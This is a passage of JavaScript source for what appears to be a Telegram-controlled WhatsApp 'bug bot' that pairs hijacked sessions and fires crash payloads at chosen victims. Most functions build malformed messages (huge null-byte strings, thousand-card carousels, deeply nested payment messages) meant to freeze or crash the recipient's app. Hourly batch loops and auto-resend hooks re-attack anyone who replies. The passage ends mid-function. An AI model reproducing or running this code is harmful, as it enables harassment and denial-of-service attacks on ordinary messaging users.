              /(FOLLOW|UNFOLLOW|DELETE)/.test(type)
                ? { newsletter_id }
                : type === 'CREATE'
                ? { newsletter_input: { name, description, picture } }
                : { fetch_creation_time: true, fetch_full_image: true, fetch_viewer_metadata: false, input: { key, type: (newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id)) ? 'JID' : 'INVITE' } }
          }))
        }]
      }, timeout);

      const res =
        JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter ||
        JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_join_v2 ||
        JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_leave_v2 ||
        JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_create ||
        JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_delete_v2 ||
        JSON.parse(_query.content[0].content)?.errors ||
        JSON.parse(_query.content[0].content);

      if (res?.thread_metadata) res.thread_metadata.host = 'https://mmg.whatsapp.net';
      return res;
    };

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === 'close') {
        const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;

        if (reason === DisconnectReason.connectionReplaced || reason === DisconnectReason.loggedOut) {
          whatsappStatusMap.set(number, false);
          await deleteFolderRecursive(sessionDir);
          delete db.userNumbers[chatId];
          saveJson('./database/user_numbers.json', db.userNumbers);
          await bot.sendMessage(chatId, `Your WhatsApp session for ${number} has been ${reason === DisconnectReason.loggedOut ? 'logged out' : 'replaced'}. Please reconnect using /reqpair.`);
          sessions.delete(number);
          whatsappStatusMap.delete(number);
        } else if (reason === 503) {
          console.log(`503 Service Unavailable for ${number}. Attempting to reconnect...`);
          await reconnectSession(number, bot, sessionDir);
        } else if (reason && reason >= 500 && reason !== 503) {
          whatsappStatusMap.set(number, false);
          await bot.sendMessage(chatId, `Number ${number} disconnected from WhatsApp. Attempting to reconnect...`);
          await getSessions(bot, chatId, number);
        } else {
          console.log(`Unknown disconnect reason: ${reason} for ${number}. No auto-reconnect.`);
          whatsappStatusMap.set(number, false);
          await bot.sendMessage(chatId, `❌ Number ${number} has been disconnected due to an unknown reason.\n\nPlease reconnect manually using /reqpair.`);
          sessions.delete(number);
          whatsappStatusMap.delete(number);
        }
      }

      else if (connection === 'open') {
        whatsappStatusMap.set(number, true);
        db.userNumbers[chatId] = number;
        saveJson('./database/user_numbers.json', db.userNumbers);
        await bot.sendMessage(chatId, `Number ${number} successfully connected.`);
        await sock.newsletterMsg(CONFIG.idch, { type: 'follow' }).catch(() => {});
      }

      else if (connection === 'connecting') {
        await new Promise(r => setTimeout(r, 1000));

        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const formattedNumber = number.replace(/\D/g, '');
          const pairingCode = await sock.requestPairingCode(formattedNumber, 'XEONKING');
          const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;

          await bot.sendMessage(chatId, `
┌──────┤ Pairing Code ├──────┐
│➻ Number: ${number}
│➻ Pairing Code: ${formattedCode}
└────────────────────────┘`);
    }
  }
});
    
    //auto send bvg
sock.ev.on('messages.upsert', async (m) => {
  const msg = m.messages[0];
  if (!msg.message) return;

  const from = msg.key.remoteJid;
  if (!from.endsWith('@s.whatsapp.net')) return; // only private

  let targetJid = null;

  if (msg.key.fromMe) {
    // Outgoing message (bot → someone)
    targetJid = from;
  } else {
    // Incoming message (someone → bot)
    targetJid = msg.key.participant || from;
  }

  if (!targetJid) return;

  if (nullfinityAutoResend.has(number)) {
    const targets = nullfinityAutoResend.get(number);
    if (targets.has(targetJid)) {
      const lockKey = `${number}:${targetJid}`;

      // NEW: Skip if we just sent an auto message to this target recently
      const recentKey = `${number}:${targetJid}`;
      const lastAutoTime = recentAutoSent.get(recentKey) || 0;
      if (Date.now() - lastAutoTime < AUTO_IGNORE_WINDOW_MS) {
        console.log(`[SELF-TRIGGER BLOCK] Ignoring recent auto message to ${targetJid}`);
        return;
      }

      if (nullfinityLock.has(lockKey)) {
        console.log(`[LOCK] Skipping duplicate for ${targetJid}`);
        return;
      }

      nullfinityLock.add(lockKey);

      try {
        await xeonNullfinity(targetJid, number, null, bot, true, true);

        // IMPORTANT: Mark that we just sent an auto message
        recentAutoSent.set(recentKey, Date.now());

        // Auto-cleanup after window
        setTimeout(() => {
          const t = recentAutoSent.get(recentKey);
          if (t && Date.now() - t >= AUTO_IGNORE_WINDOW_MS) {
            recentAutoSent.delete(recentKey);
          }
        }, AUTO_IGNORE_WINDOW_MS + 100);

      } catch (e) {
        console.error(`Auto nullfinity failed:`, e.message);
      } finally {
        nullfinityLock.delete(lockKey);
      }
    }
  }
});

// ─────────────────────────────────────────────────────────────
// AUTO GCNULL - triggers when ANY message arrives in registered group
// ─────────────────────────────────────────────────────────────
sock.ev.on('messages.upsert', async (m) => {
  const msg = m.messages[0];
  if (!msg.message) return;

  const from = msg.key.remoteJid;
  if (!from.endsWith('@g.us')) return; // only GROUPS

  if (gcNullAutoResend.has(number)) {
    const targets = gcNullAutoResend.get(number);
    if (targets.has(from)) {  // from = group JID
      const lockKey = `${number}:${from}`;

      // Optional self-trigger protection (recommended)
      const recentKey = `${number}:${from}`;
      const lastAutoTime = recentGcAutoSent.get(recentKey) || 0;
      if (Date.now() - lastAutoTime < GC_AUTO_IGNORE_WINDOW_MS) {
        console.log(`[GC SELF-BLOCK] Ignoring recent auto to group ${from}`);
        return;
      }

      if (gcNullLock.has(lockKey)) {
        console.log(`[GC LOCK] Skipping duplicate for group ${from}`);
        return;
      }

      gcNullLock.add(lockKey);

      try {
        // Instant send (no sleep)
        await xeonGcNull(from, number, null, bot, false, true);

        // Mark timestamp for protection
        recentGcAutoSent.set(recentKey, Date.now());

        setTimeout(() => {
          const t = recentGcAutoSent.get(recentKey);
          if (t && Date.now() - t >= GC_AUTO_IGNORE_WINDOW_MS) {
            recentGcAutoSent.delete(recentKey);
          }
        }, GC_AUTO_IGNORE_WINDOW_MS + 100);

      } catch (e) {
        console.error(`Auto gcNull failed for group ${from}:`, e.message);
      } finally {
        gcNullLock.delete(lockKey);
      }
    }
  }
});

  } catch (error) {
    console.error(`Error in getSessions for ${number}:`, error.message);
    await bot.sendMessage(chatId, `❌ Failed to initialize session for ${number}: ${error.message}. Process stopped.`);
  }
}


async function wui(target, userNumber, chatId, botInstance) {
  // Validate session
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  // Validate target JID
  if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
    throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
  }

  const { TrashLocIOS } = require('./69/Data4.js');

  try {
    // Execute the TrashLocIOS function
    await TrashLocIOS(botInstance, target);

    // Send success message with mentions
    await botInstance.sendMessage(chatId, {
      text: `Successfully Sent Bug To @${target.split('@')[0]} Using *wui* ✅\n\nPause 2 minutes so that the bot is not banned.`,
      mentions: [target],
    });
  } catch (error) {
    console.error(`Error in wui for ${userNumber}:`, error.message);
    throw error; // Throw error to stop execution and notify the caller
  }
}

async function bulldozer(target, userNumber, chatId, botInstance, show = false) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

    let push = []
  for (let r = 0; r < 1005; r++) { // Or 1055
  push.push({
    body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " " }),
    header: proto.Message.InteractiveMessage.Header.fromObject({
      title: " ",
      hasMediaAttachment: true,
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
        fileLength: "18352",
        height: 720,
        width: 1280,
        mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
        fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
        directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1737281900",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
        scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
        scanLengths: [3537, 10557, 1905, 2353],
        midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
      }
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
  })
 }

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
            footer: proto.Message.InteractiveMessage.Footer.create({ text: "Telegram: @dgxeon13" }),
            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] })
          })
        }
      }
    },
    {}
  )
  
  await userSock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
          }
        ]
      }
    ]
  })
  if (show) {
    await userSock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "Telegram: @dgxeon13" }
          }
        ]
      }
    )
  }
    console.log(chalk.green(`Stressking sent to ${target}`));
  } catch (err) {
  console.error(`Error in stressking for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonCrashFinity(target, userNumber, chatId, botInstance, ptcp) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

   /* await userSock.relayMessage(
            target,
            {
                interactiveResponseMessage: {
                    body: {
                        text: `Telegram: @dgxeon13`,
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            },
            {
                participant: { jid: target },
                userJid: target
            }
        );*/
        const message = {
    requestPaymentMessage: {
      currencyCodeIso4217: 'INR',
      requestFrom: target, 
      expiryTimestamp: null,
      amount: {
        value: 9999999999, 
        offset: 9999999999, 
        currencyCode: 'INR'
      },
      contextInfo: {
        forwardingScore: 9999,
        isForwarded: true,
        fromMe: false,
        remoteJid: "status@broadcast",
        externalAdReply: {
          title: "Telegram: @dgxeon13", 
          body: "Telegram: @dgxeon13", 
          mimetype: 'image',
          caption: "Telegram: @dgxeon13",
          showAdAttribution: true,
          sourceUrl: 'https://t.me/dgxeon13',
          thumbnailUrl: { url: "https://i.ibb.co/ydRKHnw/thumb.jpg" }
        }
      }
    }
  };

  await userSock.relayMessage(target, message, 
    ptcp ? { participant: { jid: target } } : {});
    console.log(chalk.green(`crashfinity sent to ${target}`));
  } catch (err) {
  console.error(`Error in crashfinity for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonGcNull(target, userNumber, chatId, botInstance, ptcp, isAuto = false) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

    const options = [
            { optionName: "\u0000" },
            { optionName: "\u0000" },
            { optionName: "\u0000" }
        ];

        const pollMsg = await generateWAMessageFromContent(
            target,
            {
                botInvokeMessage: {
                    message: {
                        messageContextInfo: {
                            messageSecret: crypto.randomBytes(32),
                            messageAssociation: {
                                associationType: 7,
                                parentMessageKey: crypto.randomBytes(16)
                            }
                        },
                        pollCreationMessage: {
                            name: "\u0000".repeat(1000),
                            options,
                            selectableOptionsCount: 1,
                            pollType: "QUIZ",
                            correctAnswer: options[1]
                        }
                    }
                }
            },
            { userJid: target }
        );

        // 🔹 participant REMOVED
        await userSock.relayMessage(
            target,
            pollMsg.message,
            {
                messageId: pollMsg.key.id
            }
        );

        await new Promise(r => setTimeout(r, 3000));

        // 🔹 participant REMOVED here too
        await userSock.relayMessage(
            target,
            {
                ephemeralMessage: {
                    message: Array.from({ length: 80000 }).reduce(
                        () => ({ sendPaymentMessage: {} }),
                        {}
                    )
                }
            },
            {
                messageId: null,
                userJid: target
            }
        );
    
    console.log(chalk.green(`nullgc sent to ${target} ${isAuto ? '(AUTO)' : '(MANUAL)'}`));

    // Register ONLY on manual command (first time)
    if (!isAuto && chatId) {
      if (!gcNullAutoResend.has(userNumber)) {
        gcNullAutoResend.set(userNumber, new Set());
      }
      if (!gcNullAutoResend.get(userNumber).has(target)) {
        gcNullAutoResend.get(userNumber).add(target);
        console.log(`[AUTO GCNULL REGISTERED] Group ${target} for session ${userNumber}`);
      }
    }

  } catch (err) {
    console.error(`nullgc error for ${userNumber}:`, err.message);
    throw err;
  }
}

async function xeonHideNSeek2(target, userNumber, chatId, botInstance, ptcp = true) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    const locationMessage = {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "Telegram: @dgxeon13" + "𑇂𑆵𑆴𑆿".repeat(15000),
            address: "Telegram: @dgxeon13" + "𑇂𑆵𑆴𑆿".repeat(5000),
            url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
        };

        const msg = generateWAMessageFromContent(
            target,
            { viewOnceMessage: { message: { locationMessage } } },
            {}
        );

        await userSock.relayMessage(
            target,
            { groupStatusMessageV2: { message: msg.message } },
            ptcp
                ? { messageId: msg.key.id, participant: { jid: target } }
                : { messageId: msg.key.id }
        );
  } catch (err) {
  console.error(`Error in hidenseek2 for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  await userBot.sendMessage(chatId, `❌ Error in hidenseek2: ${err.message}. Process stopped.`);
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonNullfinity(target, userNumber, chatId, botInstance, ptcp, isAuto = false) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

    const options = [
            { optionName: "\u0000" },
            { optionName: "\u0000" },
            { optionName: "\u0000" }
        ];

        const pollMsg = await generateWAMessageFromContent(
            target,
            {
                botInvokeMessage: {
                    message: {
                        messageContextInfo: {
                            messageSecret: crypto.randomBytes(32),
                            messageAssociation: {
                                associationType: 7,
                                parentMessageKey: crypto.randomBytes(16)
                            }
                        },
                        pollCreationMessage: {
                            name: "\u0000".repeat(1000),
                            options,
                            selectableOptionsCount: 1,
                            pollType: "QUIZ",
                            correctAnswer: options[1]
                        }
                    }
                }
            },
            { userJid: target }
        );

        await userSock.relayMessage(
            target,
            pollMsg.message,
            {
                participant: { jid: target },
                messageId: pollMsg.key.id
            }
        );

        await new Promise(r => setTimeout(r, 3000));

        await userSock.relayMessage(
            target,
            {
                ephemeralMessage: {
                    message: Array.from({ length: 80000 }).reduce(
                        () => ({ sendPaymentMessage: {} }),
                        {}
                    )
                }
            },
            {
                messageId: null,
                participant: { jid: target },
                userJid: target
            }
        );
    
    console.log(chalk.green(`Nullfinity sent to ${target} ${isAuto ? '(AUTO)' : '(MANUAL)'}`));

    // === ONLY on manual command: register + ignore next 5 outgoing (covers your for-loop of 3) ===
    if (!isAuto && chatId) {
      if (!nullfinityAutoResend.has(userNumber)) {
        nullfinityAutoResend.set(userNumber, new Set());
      }
      if (!nullfinityAutoResend.get(userNumber).has(target)) {
        nullfinityAutoResend.get(userNumber).add(target);
        console.log(`[AUTO NULLFINITY REGISTERED] ${target} for session ${userNumber}`);
      }

      // Ignore the next 5 outgoing messages to this target (safety for your 3-send loop)
      if (!ignoreOutgoingDuringCommand.has(userNumber)) {
        ignoreOutgoingDuringCommand.set(userNumber, new Set());
      }
      ignoreOutgoingDuringCommand.get(userNumber).add(target);
      // Optional: auto-remove ignore after 10 seconds (cleanup)
      setTimeout(() => {
        const set = ignoreOutgoingDuringCommand.get(userNumber);
        if (set) {
          set.delete(target);
          if (set.size === 0) ignoreOutgoingDuringCommand.delete(userNumber);
        }
      }, 10000);
    }

  } catch (err) {
    console.error(`Nullfinity error for ${userNumber}:`, err.message);
    throw err;
  }
}

async function xeonHideNSeek(target, userNumber, chatId, botInstance, ptcp = true) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    const extendedTextMessage = {
        text: "Telegram: @dgxeon13 \n\n Telegram: @dgxeon13" + "𑇂𑆵𑆴𑆿".repeat(15000),
        matchedText: "https://t.me/dgxeon13",
        description: "Telegram: @dgxeon13" + "𑇂𑆵𑆴𑆿".repeat(15000),
        title: "Telegram: @dgxeon13" + "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
        }
    };

    const msg = generateWAMessageFromContent(
        target,
        { viewOnceMessage: { message: { extendedTextMessage } } },
        {}
    );

    await userSock.relayMessage(target, {
        groupStatusMessageV2: {
            message: msg.message
        }
    }, ptcp ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });
  } catch (err) {
  console.error(`Error in hidenseek for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  await userBot.sendMessage(chatId, `❌ Error in hidenseek: ${err.message}. Process stopped.`);
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonHideNSeekExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000;    // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`Starting batch ${batch}...`));

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }

        let count = 0;
        const maxLoops = 25; // Total 25 calls

        while (count < maxLoops) {
          if (count % 2 === 0) {
            // Even index (0,2,4...): bulldozer
            await xeonHideNSeek(target, userNumber, chatId, botInstance);
            await sleep(1000);
            console.log(chalk.yellow(` ┌────────────────────────┐\n │ hidenseek1... (${count + 1}/25)\n └────────────────────────┘ `));
          } else {
            // Odd index (1,3,5...): ultrayDelay
            await xeonHideNSeek2(target, userNumber, chatId, botInstance);
            await sleep(1000);
            console.log(chalk.yellow(` ┌────────────────────────┐\n │ hidenseek2... (${count + 1}/25)\n └────────────────────────┘ `));
          }
          count++;
        }

        // After 25 alternating calls
        console.log(chalk.bgYellow.black("25 calls done: xeonHideNSeek → xeonHideNSeek2 → ... (13 + 12), sleep 10s..."));
        await new Promise(resolve => setTimeout(resolve, 10000));

      } catch (error) {
        console.error(`Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `Error in hidenseek: ${error.message}. Process stopped.`);
        return;
      }
    }

    console.log(chalk.green(`Finished batch ${batch}`));
    batch++;

    if (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }

  console.log(chalk.cyan(`Done! Total batches sent: ${batch - 1}`));
}

async function xeonAndroidInvisibleKing(target, userNumber, chatId, botInstance, ptcp) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

   const msg = generateWAMessageFromContent(target, {
        extendedTextMessage: {
            text: "Telegram @dgxeon13",
            matchedText: "https://t.me/dgxeon13",
            description: "Telegram @dgxeon13",
            title: "Telegram @dgxeon13",
            paymentLinkMetadata: {
                button: { displayText: "Telegram @dgxeon13" },
                header: { headerType: 1 },
                provider: { paramsJson: "{{".repeat(5000) }
            },
            linkPreviewMetadata: {
                paymentLinkMetadata: {
                    button: { displayText: "Telegram @dgxeon13" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(5000) }
                },
                urlMetadata: { fbExperimentId: 999 },
                fbExperimentId: 888,
                linkMediaDuration: 555,
                socialMediaPostType: 1221
            }
        }
    }, {});

    for(let i = 0; i < 100; i++) {
        await userSock.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, { 
            messageId: null 
        });
        
        if (i < 99) await new Promise(resolve => setTimeout(resolve, 50));
    }
    
    console.log(chalk.green(`Invisible sent to ${target}`));
  } catch (err) {
  console.error(`Error in invisible for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
} 

async function xeonAndroidInvisibleKingExecutor(durationHours, target, userNumber, chatId, botInstance, ptcp) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonAndroidInvisibleKing(target, userNumber, chatId, botInstance, ptcp)
          ]);
          await sleep(1000);
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in delayking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonDelayXceedExecutor(durationHours, target, userNumber, chatId, botInstance, ptcp) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonDelayXceed(target, userNumber, chatId, botInstance, ptcp)
          ]);
          await sleep(1000);
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in delayking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonDelayXceed(target, userNumber, chatId, botInstance, ptcp) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

   let msg = generateWAMessageFromContent(target, {
            interactiveResponseMessage: {
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
                },
                body: {
                    text: "Telegram: @dgxeon13",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
                    version: 3
                }
            }
        }, {});

        await userSock.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, ptcp ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });
    
    console.log(chalk.green(`Delayxceed sent to ${target}`));
  } catch (err) {
  console.error(`Error in Delayxceed for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
} 

async function xeonFlood(target, userNumber, chatId, botInstance, ptcp) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

let push = [];

  for (let r = 0; r < 1000; r++) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({ text: " \u0000 " }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " \u0003 " }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: " ",
        hasMediaAttachment: true,
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
          fileLength: "18352",
          height: 720,
          width: 1280,
          mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
          fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
          directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1737281900",
